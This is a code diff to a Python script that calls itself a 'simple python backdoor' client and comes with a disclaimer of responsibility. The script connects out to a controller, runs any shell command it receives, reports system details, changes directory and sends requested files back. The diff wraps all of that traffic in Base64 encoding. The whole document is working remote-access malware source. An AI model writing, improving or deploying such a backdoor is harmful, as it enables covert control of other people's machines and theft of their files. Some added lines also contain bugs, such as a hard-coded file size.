@@ -34,10 +34,16 @@ I am not responsible for anything you do with it.
 """
 
 def _base64_encode(message):
+
+    """Encode the bytes-like object s using Base64 and return a bytes object."""
+
     return base64.b64encode(message)
 
 
 def _base64_decode(message):
+
+    """Decode the Base64 encoded bytes-like object and return a ASCII string."""
+
     return base64.b64decode(message)
 
 
@@ -56,58 +62,67 @@ def simple_python_backdoor_client_connect():
 
 def run_command(command):
 
-    command_output = b'\n'
+    command_output = '\n'
 
     if len(command) > 0:
         object_command = subprocess.Popen(command,
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE,
-                                          stdin=subprocess.PIPE)
+                                          stdin=subprocess.PIPE,
+                                          universal_newlines=True)
         command_output += object_command.stdout.read() + object_command.stderr.read()
     else:
-        command_output += b'Error!'
+        command_output += 'Error!'
 
-    return command_output
+    return _base64_encode(bytes(command_output.encode()))
 
 
 def uname():
 
-    """Este comando exibe informações sobre o sistema."""
+    """Return certain system information."""
 
-    return f'System: {platform.system()}\nNode: {platform.node()}\nRelease: {platform.release()}\n' \
-           f'Version: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}\n' \
-           f'Python Version: {platform.python_version()}\nPython Compiler: {platform.python_compiler()}\n' \
-           f'Python Build: {platform.python_build()}'
+    output = f'System: {platform.system()}\nNode: {platform.node()}\nRelease: {platform.release()}\n'\
+             f'Version: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}\n'\
+             f'Python Version: {platform.python_version()}\nPython Compiler: {platform.python_compiler()}\n'\
+             f'Python Build: {platform.python_build()}'
+
+    return _base64_encode(bytes(output.encode()))
 
 
 def change_directory(sock, directory):
 
     # Change directory.
     os.chdir(directory)
-    sock.send(f'Changed directory to {os.getcwd()}'.encode())
+    sock.send(_base64_encode(f'Changed directory to {os.getcwd()}'.encode()))
 
 
-def download_files(sock, file):
+def simple_python_backdoor_send_file(sock, file):
 
     if not os.path.isfile(file):
-        sock.send(b'Target file not found!')
+        sock.send(_base64_encode('Target file not found!'))
     else:
-        sock.send(b'Sending...')
+        f_zise = '10MB'
+        sock.send(_base64_encode('Attempting download...'.encode()))
+
+        print(f'Sending {file} from <{IP}:{PORT}> File Size{f_zise}'.encode())
+
+        sock.send(_base64_encode(f'Sending {file} from <{IP}:{PORT}> File Size{f_zise}'.encode()))
         with open(file, 'rb') as _file:
             file_data = _file.read(CHUNKS)
             while file_data:
-                sock.send(file_data)
+                sock.send(_base64_encode(file_data))
                 file_data = _file.read(1024)
             time.sleep(2)
-            sock.send(b'Send file done!')
+
+            sock.send(_base64_encode('Send file done!'))
 
     print('Finished sending data')
 
 
 def main():
     _socket = simple_python_backdoor_client_connect()
-    _socket.send(BANNER)
+    _socket.send(_base64_encode(BANNER))
 
     # Infinite loop until socket can connect.
     while True:
@@ -123,10 +138,10 @@ def main():
             change_directory(_socket, str_data.split(' ')[-1])
         # Download files.
         elif 'copy' in str_data:
-            download_files(_socket, str_data.split(' ')[-1])
+            simple_python_backdoor_send_file(_socket, str_data.split(' ')[-1])
         # Get system info.
         elif 'uname' in str_data:
-            _socket.send(uname().encode())
+            _socket.send(uname())
         # Run any other command.
         else:
             output = run_command(str_data)
